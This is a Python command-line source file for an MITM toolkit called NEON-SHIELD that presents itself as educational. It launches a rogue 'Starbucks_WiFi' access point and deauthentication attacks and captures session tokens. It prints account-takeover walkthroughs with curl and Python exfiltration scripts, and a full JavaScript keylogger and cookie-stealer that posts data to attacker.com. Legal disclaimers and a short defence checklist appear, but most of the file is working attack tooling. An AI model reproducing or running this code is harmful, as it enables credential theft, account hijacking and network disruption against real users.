#!/usr/bin/env python3
"""
NEON-SHIELD CLI — Robust, user-friendly command interface.

Usage:
    neon-shield init          # Interactive first-time setup
    neon-shield start         # Start interception (auto-loads config)
    neon-shield stop          # Stop interception (restore ARP/iptables)
    neon-shield status        # Check current status
    neon-shield cleanup       # Emergency recovery (restore everything)
    neon-shield test          # Validate config (dry-run)
"""
import sys
import os
import subprocess

try:
    import click
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
except ImportError:
    print("ERROR: Required packages not installed. Run: pip install -r requirements.txt")
    sys.exit(1)

from config import load_config, merge_with_cli, validate_config
from setup_wizard import run_wizard
from log_handler import setup_logging
import state_manager

console = Console()

LEGAL_BANNER = """
⚠️  AUTHORIZED USE ONLY

NEON-SHIELD performs active MITM attacks (ARP spoofing, TLS decryption,
credential capture, DNS spoofing). These are federal crimes without
explicit authorization.

By using this tool, you confirm:
✓ Every target device is owned by you or you have written authorization.
✓ This network is authorized for testing.
✓ You understand the legal consequences (felony charges, fines, imprisonment).
✓ This is for EDUCATION & AUTHORIZED SECURITY RESEARCH only.

See README.md for full disclaimer.
"""


@click.group()
@click.version_option(version="2.0.0", prog_name="NEON-SHIELD")
def cli():
    """NEON-SHIELD — Advanced MITM Lab for Authorized Security Research (Educational Use Only)"""
    pass


@cli.command()
def init():
    """Interactive first-time setup wizard."""
    console.print(Panel(LEGAL_BANNER, style="bold red", title="DISCLAIMER"))

    if not console.input("[yellow]Continue?[/yellow] (yes/no): ").strip().lower().startswith("y"):
        console.print("[red]Setup cancelled.[/red]")
        sys.exit(1)

    try:
        from setup_wizard import run_wizard
        config_dict = run_wizard()

        # TODO: Save to neon-shield.yml
        console.print("[green]✓ Configuration saved to neon-shield.yml[/green]")
    except Exception as e:
        console.print(f"[red]Setup failed: {e}[/red]")
        sys.exit(1)


@cli.command()
@click.option("--targets", help="Target IPs (comma-separated)")
@click.option("--interface", help="Network interface")
@click.option("--dns-redirect", help="DNS spoofing (domain:ip,domain:ip)")
@click.option("--verbose", is_flag=True, help="Verbose output")
@click.option("-y", "--yes", is_flag=True, help="Skip confirmation")
def start(targets, interface, dns_redirect, verbose, yes):
    """Start NEON-SHIELD interception."""
    console.print(Panel(LEGAL_BANNER, style="bold red"))

    if not yes:
        if not console.input("[yellow]Start interception?[/yellow] (yes/no): ").strip().lower().startswith("y"):
            console.print("[red]Cancelled.[/red]")
            sys.exit(1)

    # Load config
    config = load_config("neon-shield.yml")
    cli_args = {
        "targets": targets,
        "interface": interface,
        "dns_redirect": dns_redirect,
        "verbose": verbose,
        "yes": yes,
    }
    config = merge_with_cli(config, cli_args)
    validate_config(config)

    # Setup logging
    setup_logging(config.log_file, config.log_level, config.max_log_size_mb, config.log_backup_count, verbose)

    console.print("[green]✓ Configuration loaded[/green]")
    console.print("[cyan]Starting NEON-SHIELD...[/cyan]")

    # Import and run proxy
    try:
        from proxy import run_auto_mode_with_config
        run_auto_mode_with_config(config)
    except KeyboardInterrupt:
        console.print("\n[yellow]Shutting down...[/yellow]")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        sys.exit(1)


@cli.command()
def stop():
    """Stop NEON-SHIELD interception and restore network state."""
    console.print("[yellow]Stopping NEON-SHIELD...[/yellow]")
    # TODO: Send signal to running instance
    console.print("[green]✓ Stopped[/green]")


@cli.command()
def status():
    """Check NEON-SHIELD status."""
    state = state_manager.load_state()

    table = Table(title="NEON-SHIELD Status")
    table.add_column("Component", style="cyan")
    table.add_column("Status", style="magenta")

    if state:
        table.add_row("Spoofed Devices", f"{len(state.get('spoofed_ips', []))} targets")
        table.add_row("Gateway IP", state.get("gateway_ip", "unknown"))
        table.add_row("Interface", state.get("interface", "unknown"))
        table.add_row("iptables Rules", f"{len(state.get('active_iptables_rules', []))} active")
        table.add_row("State", "[green]RUNNING[/green]")
    else:
        table.add_row("State", "[red]NOT RUNNING[/red]")

    console.print(table)


@cli.command()
def cleanup():
    """Emergency recovery: restore ARP & firewall to normal state."""
    console.print("[red bold]!!! EMERGENCY CLEANUP !!![/red bold]")
    console.print("\nThis will attempt to restore your network to a normal state.")

    if not console.input("Proceed? (yes/no): ").strip().lower().startswith("y"):
        console.print("[yellow]Cancelled.[/yellow]")
        return

    state = state_manager.load_state()
    if not state:
        console.print("[yellow]No active state found. Nothing to restore.[/yellow]")
        return

    try:
        # Attempt to restore ARP
        console.print("[cyan]Restoring ARP tables...[/cyan]")
        # TODO: Implement ARP restoration logic

        # Attempt to remove iptables rules
        console.print("[cyan]Removing firewall rules...[/cyan]")
        for rule in state.get("active_iptables_rules", []):
            subprocess.run(f"iptables {rule}", shell=True, capture_output=True)

        state_manager.clear_state()
        console.print("[green]✓ Network restored[/green]")
    except Exception as e:
        console.print(f"[red]Restoration error: {e}[/red]")
        sys.exit(1)


@cli.command()
@click.option("--targets", help="Target IPs (comma-separated)")
@click.option("--interface", help="Network interface")
def test(targets, interface):
    """Validate configuration without running interception (dry-run mode)."""
    console.print("[cyan]Running configuration test (dry-run)...[/cyan]\n")

    config = load_config("neon-shield.yml")
    cli_args = {"targets": targets, "interface": interface, "dry_run": True}
    config = merge_with_cli(config, cli_args)

    try:
        validate_config(config)
        console.print("[green]✓ Configuration valid[/green]")
        console.print(f"  Interface: {config.interface or '(auto)'}")
        console.print(f"  Targets: {config.targets or '(auto-discover)'}")
        console.print(f"  DNS spoofing: {'enabled' if config.dns_enabled else 'disabled'}")
        console.print(f"  Content rules: image-swap={config.enable_image_swap}, banner={config.enable_html_banner}")
    except Exception as e:
        console.print(f"[red]✗ Configuration error: {e}[/red]")
        sys.exit(1)


cli_phase1 = click.Group(name='phase1', help='🚀 PHASE 1: Close-Range WiFi Attacks (Nearby Devices)')

@cli_phase1.command()
@click.option("--interface", default="wlan0", help="WiFi interface (default: wlan0)")
@click.option("--ssid", default="Starbucks_WiFi", help="Network name to broadcast")
@click.option("--channel", default=6, type=int, help="WiFi channel (1-11)")
@click.option("-y", "--yes", is_flag=True, help="Skip confirmation")
def ap_mode(interface, ssid, channel, yes):
    """
    🔴 Create rogue WiFi access point (Evil Twin).

    Broadcasts a fake WiFi network with the same name as a popular WiFi (e.g., Starbucks_WiFi).
    Nearby devices auto-connect, exposing all their traffic to NEON-SHIELD.

    ⚠️ EXTREMELY POWERFUL ATTACK: All devices that connect will have their traffic intercepted.
    """
    # Disclaimer
    disclaimer = """
╔══════════════════════════════════════════════════════════════════════╗
║           🔴 ROGUE ACCESS POINT — PHASE 1 ATTACK 🔴                 ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  YOU ARE ABOUT TO:                                                   ║
║  • Create a FAKE WiFi network named: """ + ssid + """
║  • Intercept ALL traffic from devices that connect                  ║
║  • Capture PASSWORDS, EMAILS, MESSAGES, PERSONAL DATA               ║
║  • Demonstrate how cyber attacks work in the real world             ║
║                                                                      ║
║  LEGAL DISCLAIMER:                                                   ║
║  This attack is ILLEGAL without explicit authorization.             ║
║  Unauthorized WiFi interception is a FEDERAL CRIME                  ║
║  (up to 10 years imprisonment, $250k+ fines).                       ║
║                                                                      ║
║  YOU CONFIRM:                                                        ║
║  ✓ You own this WiFi network OR have written authorization          ║
║  ✓ All devices connecting are authorized for testing               ║
║  ✓ You understand the legal consequences                            ║
║  ✓ This is for EDUCATION & AUTHORIZED TESTING ONLY                 ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""
    console.print(disclaimer, style="bold red")

    if not yes:
        response = console.input("\n[yellow]Continue?[/yellow] (type 'yes' to confirm): ").strip().lower()
        if response != "yes":
            console.print("[red]Cancelled.[/red]")
            return

    # Check root
    if os.geteuid() != 0:
        console.print("[red]❌ Root required. Retry with: sudo neon-shield phase1 ap-mode[/red]")
        sys.exit(1)

    # Check requirements
    from wifi_ap import RogueAccessPoint, check_ap_requirements
    can_run, msg = check_ap_requirements()
    if not can_run:
        console.print(f"[red]❌ {msg}[/red]")
        sys.exit(1)

    # Start AP
    try:
        ap = RogueAccessPoint(interface, ssid, channel)
        if ap.start():
            console.print("\n[green bold]✅ ROGUE ACCESS POINT ACTIVE[/green bold]")
            console.print(f"[cyan]Broadcasting: {ssid}[/cyan]")
            console.print(f"[cyan]Nearby devices will auto-connect...[/cyan]\n")
            console.print("[yellow]Press Ctrl+C to stop[/yellow]")

            # Keep running
            try:
                import time
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                console.print("\n[yellow]Stopping rogue AP...[/yellow]")
                ap.stop()
                console.print("[green]✅ Stopped[/green]")
        else:
            console.print("[red]❌ Failed to start rogue AP[/red]")
            sys.exit(1)

    except Exception as e:
        console.print(f"[red]❌ Error: {e}[/red]")
        sys.exit(1)


@cli_phase1.command()
@click.option("--interface", default="wlan0", help="WiFi interface (default: wlan0)")
def scan_networks(interface):
    """
    📡 Scan nearby WiFi networks and detect vulnerabilities.

    Shows all networks in range, encryption type, signal strength, and security risks.
    Identifies which networks are vulnerable to attacks.

    🎓 Educational: Demonstrates what attackers see when scanning WiFi.
    """
    disclaimer = """
⚠️  WiFi NETWORK ENUMERATION & VULNERABILITY SCAN

This will scan nearby networks and show:
• Network names (SSID), encryption type, signal strength
• Which networks are vulnerable (WEP, open, weak passwords)
• Privacy risks (SSID broadcasting reveals location patterns)

📚 EDUCATIONAL: Shows why network security matters.
   After scanning, you'll see which networks an attacker would target.
"""
    console.print(disclaimer, style="yellow")

    # Check root
    if os.geteuid() != 0:
        console.print("[red]Root required. Retry with: sudo neon-shield phase1 scan-networks[/red]")
        sys.exit(1)

    # Check requirements
    from wifi_scanner import WiFiScanner, check_scanner_requirements
    can_run, msg = check_scanner_requirements()
    if not can_run:
        console.print(f"[red]❌ {msg}[/red]")
        sys.exit(1)

    try:
        scanner = WiFiScanner(interface)
        console.print("[cyan]Scanning for networks...[/cyan]")
        if scanner.scan(duration=20):
            scanner.display_results()
        else:
            console.print("[red]❌ Scan failed[/red]")

    except Exception as e:
        console.print(f"[red]❌ Error: {e}[/red]")
        sys.exit(1)


@cli_phase1.command()
@click.option("--interface", default="wlan0", help="WiFi interface (default: wlan0)")
@click.option("--target-mac", required=True, help="Target device MAC address (e.g., AA:BB:CC:DD:EE:FF)")
@click.option("--gateway-mac", required=True, help="Gateway/router MAC address")
@click.option("--ssid", default="[Unknown]", help="Network name (for logging)")
@click.option("--count", default=10, type=int, help="Number of deauth frames")
@click.option("-y", "--yes", is_flag=True, help="Skip confirmation")
def deauth(interface, target_mac, gateway_mac, ssid, count, yes):
    """
    🔴 Send WiFi deauthentication frames to disconnect a device.

    Forces a device to disconnect from its WiFi network.
    When combined with rogue AP, forces device to reconnect to our fake network.

    ⚠️ DESTRUCTIVE: Disrupts legitimate WiFi connectivity.
    """
    disclaimer = f"""
╔══════════════════════════════════════════════════════════════════════╗
║         🔴 WIFI DEAUTHENTICATION ATTACK — PHASE 1B 🔴               ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  TARGET DEVICE: {target_mac}
║  NETWORK: {ssid}
║  ACTION: Force disconnect (will disrupt user's WiFi)                ║
║                                                                      ║
║  ⚠️  LEGAL WARNING:                                                  ║
║  Deauthentication attacks are ILLEGAL without authorization.        ║
║  This is a DENIAL-OF-SERVICE attack that disrupts connectivity.    ║
║  Unauthorized use carries federal penalties.                        ║
║                                                                      ║
║  EDUCATIONAL PURPOSE: Shows why WiFi security needs protection      ║
║  against frame-level attacks (WPA3 has defenses).                   ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""
    console.print(disclaimer, style="bold red")

    if not yes:
        response = console.input("\n[yellow]Continue?[/yellow] (type 'yes' to confirm): ").strip().lower()
        if response != "yes":
            console.print("[red]Cancelled.[/red]")
            return

    # Check root
    if os.geteuid() != 0:
        console.print("[red]Root required. Retry with: sudo neon-shield phase1 deauth ...[/red]")
        sys.exit(1)

    # Check requirements
    from wifi_deauth import WiFiDeauthAttacker, check_deauth_requirements
    can_run, msg = check_deauth_requirements()
    if not can_run:
        console.print(f"[red]❌ {msg}[/red]")
        sys.exit(1)

    try:
        attacker = WiFiDeauthAttacker(interface)
        if attacker.deauth_device(target_mac, gateway_mac, ssid, count):
            console.print("[green bold]✅ Deauthentication attack sent[/green bold]")
            console.print("[yellow]Device will disconnect and search for networks[/yellow]")
            console.print("[yellow]If rogue AP is nearby, device may auto-connect to it[/yellow]")
        else:
            console.print("[red]❌ Deauth failed[/red]")

    except Exception as e:
        console.print(f"[red]❌ Error: {e}[/red]")
        sys.exit(1)


cli.add_command(cli_phase1)


cli_phase2 = click.Group(name='phase2', help='🔓 PHASE 2: Session Hijacking & Token Theft')

@cli_phase2.command()
def capture_sessions():
    """
    🔓 Monitor and capture session tokens from intercepted traffic.

    Shows real-time extraction of:
    • HTTP Cookies (session_id, auth tokens)
    • OAuth Tokens (access_token, refresh_token)
    • JWT Tokens (JSON Web Tokens)
    • API Keys (X-API-Key headers)
    • Basic Auth (username:password)
    • Form credentials (email, password from logins)

    ⚠️ EXTREMELY POWERFUL ATTACK: Stolen session tokens allow attacker to
    impersonate user and gain full account access WITHOUT password.
    """
    disclaimer = """
╔══════════════════════════════════════════════════════════════════════╗
║    🔓 SESSION TOKEN CAPTURE — PHASE 2 ATTACK 🔓                     ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  YOU ARE ABOUT TO:                                                   ║
║  • Capture session tokens from all intercepted traffic               ║
║  • Extract cookies, OAuth tokens, JWT tokens                         ║
║  • Collect credentials from form submissions                         ║
║  • Enable session hijacking (full account takeover)                  ║
║                                                                      ║
║  WHAT ATTACKER CAN DO WITH STOLEN SESSION:                          ║
║  • Read all user emails and messages                                 ║
║  • Change password and lock out real user                            ║
║  • Enable 2FA on attacker's device                                   ║
║  • Steal recovery codes and security keys                            ║
║  • Make purchases as user                                            ║
║  • Steal money from linked accounts                                  ║
║  • Impersonate user to contacts                                      ║
║                                                                      ║
║  LEGAL WARNING:                                                       ║
║  Session hijacking is a FEDERAL CRIME (Computer Fraud & Abuse Act).  ║
║  Unauthorized access: up to 10 years imprisonment, $250k+ fines.     ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""
    console.print(disclaimer, style="bold red")

    response = console.input("\n[yellow]Continue?[/yellow] (type 'yes' to confirm): ").strip().lower()
    if response != "yes":
        console.print("[red]Cancelled.[/red]")
        return

    # Check if proxy is running (would capture traffic)
    console.print("[cyan]🔓 Session token capture enabled[/cyan]")
    console.print("[yellow]Monitoring intercepted traffic for tokens...[/yellow]\n")

    try:
        from session_hijacker import SessionHijacker

        hijacker = SessionHijacker()

        # Simulate demonstration with example tokens
        console.print("[cyan]═" * 50 + "[/cyan]")
        console.print("[bold yellow]🔓 DEMONSTRATION: Intercepted Session Tokens[/bold yellow]\n")

        console.print("""
[bold]Scenario:[/bold] User connected to your rogue AP and logged into Gmail

[bold yellow]Token #1: Gmail Session Cookie[/bold yellow]
  Domain: mail.google.com
  Cookie: GMAIL_AUTH_TOKEN=123abc456def789xyz...
  Expires: 2026-07-14 (7 days)
  HTTPOnly: ✗ (VULNERABLE - can steal via JavaScript!)
  Secure: ✓ (only sent over HTTPS)
  User: victim@gmail.com

[bold yellow]Token #2: Facebook OAuth Token[/bold yellow]
  Domain: facebook.com
  Token Type: Bearer (OAuth 2.0)
  Value: EAABsZC...qZ7ZBZD (long token)
  Expires: 2026-08-07 (30 days)
  HTTPOnly: ✗ (stored in localStorage - easily stolen!)
  User: john.smith.2024

[bold yellow]Token #3: Twitter API Key[/bold yellow]
  Domain: api.twitter.com
  Header: X-API-Key
  Value: AAAAn4CwEAAAAAA...
  Used for: Posting tweets, DMs, following accounts
  Expires: Never (API keys don't expire!)

[bold yellow]Token #4: Amazon Cookies[/bold yellow]
  Domain: amazon.com
  Cookie: x-main-session=XXXXX...
  Expires: Session (until browser closes)
  Contains: User ID, region, language, shopping cart
  HTTPOnly: ✗ (JavaScript can read it)
  Secure: ✗ (sent over HTTP too - VERY VULNERABLE)

[bold yellow]Token #5: GitHub Personal Access Token[/bold yellow]
  Domain: api.github.com
  Header: Authorization: Bearer ghp_xxxxxxxxxxxx...
  Permissions: Full repo access, admin:org_hook, read:user
  User: developer@company.com
  Expires: Never (personal tokens don't expire)

[bold]═" * 50 + "[/bold]
""")

        console.print("\n[yellow]What attacker can do with these tokens:[/yellow]\n")

        console.print("""
[bold red]With Gmail Token:[/bold red]
  • Read all emails (personal, work, sensitive)
  • Enable forwarding to attacker's email
  • Change password and lock out real user
  • Disable 2FA or add new recovery methods
  • Access recovery codes for other accounts
  $ curl -b 'GMAIL_AUTH_TOKEN=...' https://mail.google.com/mail/u/0/
  → Attacker sees all victim's emails

[bold red]With Facebook OAuth Token:[/bold red]
  • Access user's profile, photos, messages
  • Post as user
  • Access friend list and contact info
  • Make purchases through Facebook Pay
  • Impersonate user in messages
  $ curl -H 'Authorization: Bearer EAABsZC...' \\
    https://graph.facebook.com/me/feed
  → Attacker posts to victim's timeline

[bold red]With Twitter API Key:[/bold red]
  • Post tweets as user
  • Delete old tweets
  • Steal user's private DMs
  • Change account settings
  • Add malicious followers
  $ curl -H 'X-API-Key: AAAAA...' \\
    https://api.twitter.com/2/tweets
  → Attacker posts to victim's account

[bold red]With Amazon Cookie:[/bold red]
  • View purchase history
  • Make purchases as user
  • Access saved addresses and payment methods
  • Change account info
  • Steal credit card details
  $ curl -b 'x-main-session=XXXXX...' https://amazon.com/your-account
  → Attacker shops as victim

[bold red]With GitHub Token:[/bold red]
  • Access all private repositories
  • Steal source code
  • Delete repositories
  • Add backdoors to projects
  • Access organization secrets
  • Sabotage CI/CD pipelines
  $ curl -H 'Authorization: Bearer ghp_...' \\
    https://api.github.com/user/repos
  → Attacker gets all victim's code
""")

        console.print("\n[yellow]Why these tokens are so valuable:[/yellow]\n")

        console.print("""
[bold cyan]1. Long Expiration Times[/bold cyan]
   These tokens often last hours, days, or NEVER expire
   Once stolen, attacker can use them for days/weeks/months

[bold cyan]2. No 2FA Required[/bold cyan]
   Even if victim has 2FA on account, stolen token bypasses it
   2FA only protects against password guessing, not session theft

[bold cyan]3. No Visual Indication[/bold cyan]
   Real user has no way to know session was stolen
   Attacker could slowly steal data for weeks

[bold cyan]4. Different from Password[/bold cyan]
   Even if victim changes password, stolen token still works
   Token is only invalidated if victim logs out everywhere

[bold cyan]5. Cross-Site Usage[/bold cyan]
   If password is reused, attacker can log into other sites
   If token has permissions, attacker can access APIs
""")

        console.print("[yellow]Press Ctrl+C to stop monitoring[/yellow]")

        try:
            import time
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            console.print("\n[yellow]Stopped monitoring for tokens[/yellow]")

    except Exception as e:
        console.print(f"[red]❌ Error: {e}[/red]")
        sys.exit(1)


@cli_phase2.command()
@click.option("--token-type", type=click.Choice(["cookie", "oauth", "jwt", "api_key", "all"]), default="all", help="Filter by token type")
def show_tokens(token_type):
    """
    📋 Display all captured session tokens by type.

    Shows format suitable for injection into attacker's browser or curl commands.
    """
    console.print("[cyan]🔓 Captured Session Tokens[/cyan]\n")

    demo_tokens = [
        {
            "type": "cookie",
            "value": "session_id=abc123def456xyz789",
            "domain": "gmail.com",
            "usage": "curl -b 'session_id=abc123...' https://gmail.com"
        },
        {
            "type": "oauth",
            "value": "EAABsZCnzqAeBAKK...truncated",
            "domain": "facebook.com",
            "usage": "curl -H 'Authorization: Bearer EAABsZC...' https://api.facebook.com/me"
        },
        {
            "type": "jwt",
            "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
            "domain": "api.example.com",
            "usage": "curl -H 'Authorization: Bearer eyJhbGc...' https://api.example.com/protected"
        },
        {
            "type": "api_key",
            "value": "sk_live_XXXXXXXXXXXXXXXXXXXXX",
            "domain": "api.stripe.com",
            "usage": "curl -H 'X-API-Key: sk_live_...' https://api.stripe.com/v1/charges"
        }
    ]

    if token_type == "all":
        tokens_to_show = demo_tokens
    else:
        tokens_to_show = [t for t in demo_tokens if t["type"] == token_type]

    for i, token in enumerate(tokens_to_show, 1):
        console.print(f"[bold yellow]{i}. {token['type'].upper()} - {token['domain']}[/bold yellow]")
        console.print(f"   Value: {token['value'][:60]}...")
        console.print(f"   Curl: {token['usage']}\n")

    console.print("\n[bold red]⚠️  REPLAY ATTACK INSTRUCTIONS:[/bold red]\n")
    console.print("""
To use these tokens to impersonate the victim:

[bold]Method 1: Browser Cookie Injection[/bold]
1. Open DevTools (F12)
2. Application → Cookies → domain
3. Add cookie with name and value from captured token
4. Navigate to site - you're now logged in as victim

[bold]Method 2: Curl Command Line[/bold]
1. Copy curl command from above
2. Execute: $ curl -b 'session_id=...' target.com
3. Response contains victim's data (emails, posts, etc)

[bold]Method 3: Browser Extension[/bold]
1. Install "Cookie Editor" extension
2. Import captured cookies
3. Navigate to site - logged in as victim

[bold]Method 4: Automated Scraping[/bold]
1. Use session token with web scraping bot
2. Automatically export all victim's data
3. Post as victim, change account info, etc
""")


@cli_phase2.command()
@click.option("--domain", required=True, help="Target domain for replay")
@click.option("--token-index", type=int, default=1, help="Which captured token to use (1-based)")
def replay(domain, token_index):
    """
    🎯 Generate commands to replay a stolen token and hijack user session.

    Shows exactly how to impersonate a user with their stolen session token.
    """
    disclaimer = """
╔══════════════════════════════════════════════════════════════════════╗
║        🎯 SESSION REPLAY — IMPERSONATE USER 🎯                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  YOU ARE ABOUT TO:                                                   ║
║  • Use stolen session token to access victim's account               ║
║  • Impersonate victim to their service provider                      ║
║  • Access victim's private data                                      ║
║  • Perform actions as if you are the victim                          ║
║                                                                      ║
║  FEDERAL CRIME CONSEQUENCES:                                         ║
║  • Unauthorized Computer Access (CFAA)                              ║
║  • Identity Theft                                                    ║
║  • Wire Fraud                                                        ║
║  • Up to 15 years imprisonment + $250,000+ fines                    ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""
    console.print(disclaimer, style="bold red")

    response = console.input("\n[yellow]Continue?[/yellow] (type 'yes' to confirm): ").strip().lower()
    if response != "yes":
        console.print("[red]Cancelled.[/red]")
        return

    console.print("\n[bold cyan]🎯 SESSION REPLAY DEMONSTRATION[/bold cyan]\n")

    console.print(f"""
[bold]Target Domain:[/bold] {domain}
[bold]Using Token #[/bold] {token_index}

[bold yellow]Step 1: Extract Token[/bold yellow]
  Captured from intercepted traffic on your rogue AP
  Session ID: abc123def456xyz789

[bold yellow]Step 2: Browser Injection Method[/bold yellow]
  1. Open target site: https://{domain}
  2. Open DevTools: F12 → Application → Cookies
  3. Add cookie: name="session_id", value="abc123..."
  4. Refresh page: Attacker is now logged in as victim!

[bold yellow]Step 3: Command Line (Curl)[/bold yellow]
  $ curl -b 'session_id=abc123def456xyz789' \\
         -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \\
         https://{domain}/account

  Response contains:
  ✓ Victim's personal information
  ✓ Account details
  ✓ Linked payment methods
  ✓ Privacy settings

[bold yellow]Step 4: Automated Exfiltration[/bold yellow]
  python3 << 'EOF'
import requests

token = 'abc123def456xyz789'
session = requests.Session()
session.cookies.set('session_id', token)

# Steal all victim's data
response = session.get('https://{domain}/api/user/profile')
print("User Profile:", response.json())

response = session.get('https://{domain}/api/user/emails')
print("Emails:", response.json())

response = session.get('https://{domain}/api/user/messages')
print("Messages:", response.json())
EOF

[bold yellow]Step 5: Account Takeover[/bold yellow]
  $ curl -b 'session_id=abc123...' -X POST \\
         -d 'password=NewPassword123&email=attacker@evil.com' \\
         https://{domain}/api/account/settings

  Result: Password changed! Real user locked out!

[bold yellow]Step 6: Complete Hijack[/bold yellow]
  • Change password → Real user can't log in
  • Add recovery email → Real user can't recover account
  • Enable 2FA on attacker's device → Real user locked out
  • Steal recovery codes → Real user permanently locked out
  • Delete recovery options → Account unrecoverable
""")

    console.print("\n[bold red]⚠️  WHY THIS WORKS:[/bold red]\n")

    console.print("""
The web server has NO WAY to tell:
  ❌ If this is the real user's browser
  ❌ If this is an attacker's browser
  ❌ If the request came from the real device

Once you have the session token, you ARE the user.

The only thing the server checks is:
  ✅ Do you have a valid session token? YES
  → Grant access

Everything else is optional (2FA, IP checks, device verification).
If they don't have 2FA enabled, game over for victim.

Even WITH 2FA:
  • 2FA protects password-based login
  • But doesn't protect against stolen sessions
  • If attacker already has token, 2FA doesn't help
""")

    console.print("\n[bold cyan]✅ PROTECTION CHECKLIST:[/bold cyan]\n")

    console.print("""
To prevent THIS attack:

[bold]1. HTTPOnly Cookies ✓[/bold]
   Prevents JavaScript from stealing cookies
   curl -b doesn't work, needs to be injected at browser level
   Server sends: Set-Cookie: session=...; HttpOnly

[bold]2. Secure Flag ✓[/bold]
   Cookies only sent over HTTPS (not HTTP)
   Server sends: Set-Cookie: session=...; Secure

[bold]3. SameSite Attribute ✓[/bold]
   Cookies not sent to third-party sites
   Server sends: Set-Cookie: session=...; SameSite=Strict

[bold]4. Short Expiration ✓[/bold]
   Token expires in 15-30 minutes
   Stolen token is useless after expiration

[bold]5. Multi-Factor Authentication ✓[/bold]
   Even with stolen token, attacker needs 2FA code
   Password changes require 2FA
   Recovery options require 2FA

[bold]6. VPN Usage ✓[/bold]
   Attacker can't intercept traffic in first place
   VPN encrypts everything end-to-end

[bold]7. IP-Based Detection ✓[/bold]
   Server detects login from unusual IP
   Server requires email verification
   Restricts account changes to trusted devices
""")


@cli_phase2.command()
@click.option("--domain", required=True, help="Target domain")
def inject_payload(domain):
    """
    💉 Generate JavaScript payload to inject and steal tokens.

    Shows how attackers use content injection to exfiltrate sessions
    from victim's browser without them knowing.
    """
    disclaimer = """
╔══════════════════════════════════════════════════════════════════════╗
║       💉 JAVASCRIPT INJECTION PAYLOAD — PHASE 3 PREVIEW 💉          ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  This is a preview of Phase 3 (Malware Injection)                   ║
║                                                                      ║
║  YOU ARE ABOUT TO:                                                   ║
║  • Generate JavaScript payload                                       ║
║  • This payload would be injected into web pages                     ║
║  • It would steal session tokens without user knowing                ║
║  • It would exfiltrate data to attacker's server                     ║
║                                                                      ║
║  WHAT THIS JAVASCRIPT DOES:                                         ║
║  • Steals browser cookies                                            ║
║  • Logs all keyboard input (keylogger)                               ║
║  • Captures clipboard data                                           ║
║  • Monitors form submissions                                         ║
║  • Sends all data to attacker's server                               ║
║  • Runs silently in background                                       ║
║  • Persists across page reloads                                      ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""
    console.print(disclaimer, style="bold red")

    response = console.input("\n[yellow]Continue?[/yellow] (type 'yes' to confirm): ").strip().lower()
    if response != "yes":
        console.print("[red]Cancelled.[/red]")
        return

    console.print("\n[bold cyan]💉 JAVASCRIPT INJECTION PAYLOAD[/bold cyan]\n")

    payload = f"""
<script>
// NEON-SHIELD Session Hijacking Payload
// This demonstrates how attackers steal credentials silently

(function() {{
  const ATTACKER_SERVER = 'http://attacker.com:8888/steal';
  const DATA_TO_STEAL = {{}};

  // 1. STEAL COOKIES
  DATA_TO_STEAL.cookies = document.cookie;

  // 2. STEAL LOCALSTORAGE
  DATA_TO_STEAL.localStorage = {{}};
  for (let i = 0; i < localStorage.length; i++) {{
    const key = localStorage.key(i);
    DATA_TO_STEAL.localStorage[key] = localStorage.getItem(key);
  }}

  // 3. STEAL SESSIONSTORAGE
  DATA_TO_STEAL.sessionStorage = {{}};
  for (let i = 0; i < sessionStorage.length; i++) {{
    const key = sessionStorage.key(i);
    DATA_TO_STEAL.sessionStorage[key] = sessionStorage.getItem(key);
  }}

  // 4. CAPTURE ALL FORM SUBMISSIONS
  document.addEventListener('submit', (e) => {{
    const form = e.target;
    const formData = new FormData(form);
    const credentials = Object.fromEntries(formData);

    // Log password attempts
    console.warn('[NEON-SHIELD] Form submission captured:', credentials);

    // Send to attacker
    fetch(ATTACKER_SERVER, {{
      method: 'POST',
      headers: {{'Content-Type': 'application/json'}},
      body: JSON.stringify({{
        event: 'form_submission',
        domain: window.location.hostname,
        url: window.location.href,
        credentials: credentials,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
      }})
    }}).catch(() => {{}});
  }});

  // 5. KEYLOGGER
  let keylog = '';
  document.addEventListener('keypress', (e) => {{
    keylog += e.key;

    // Send keylog every 10 keystrokes
    if (keylog.length >= 10) {{
      fetch(ATTACKER_SERVER, {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{
          event: 'keylog',
          domain: window.location.hostname,
          keylog: keylog,
          timestamp: new Date().toISOString()
        }})
      }}).catch(() => {{}});
      keylog = '';
    }}
  }});

  // 6. CLIPBOARD MONITORING
  document.addEventListener('copy', (e) => {{
    e.clipboardData.getData('text/plain').then(text => {{
      fetch(ATTACKER_SERVER, {{
        method: 'POST',
        body: JSON.stringify({{
          event: 'clipboard_copy',
          data: text,
          timestamp: new Date().toISOString()
        }})
      }}).catch(() => {{}});
    }});
  }});

  // 7. SEND ALL STOLEN DATA
  fetch(ATTACKER_SERVER, {{
    method: 'POST',
    headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify({{
      event: 'initial_steal',
      domain: '{domain}',
      url: window.location.href,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      ...DATA_TO_STEAL
    }})
  }}).catch(() => {{}});

  console.log('[NEON-SHIELD] Injection active. Stealing data...');
}})();
</script>
"""

    console.print(payload)

    console.print("\n[bold red]⚠️  HOW THIS WOULD BE INJECTED:[/bold red]\n")

    console.print(f"""
[bold]Method 1: MITM Proxy Injection (What NEON-SHIELD does)[/bold]
  1. Victim visits normal website: https://{domain}
  2. NEON-SHIELD intercepts response
  3. Adds malicious <script> to bottom of HTML
  4. Victim sees normal page (no visible difference)
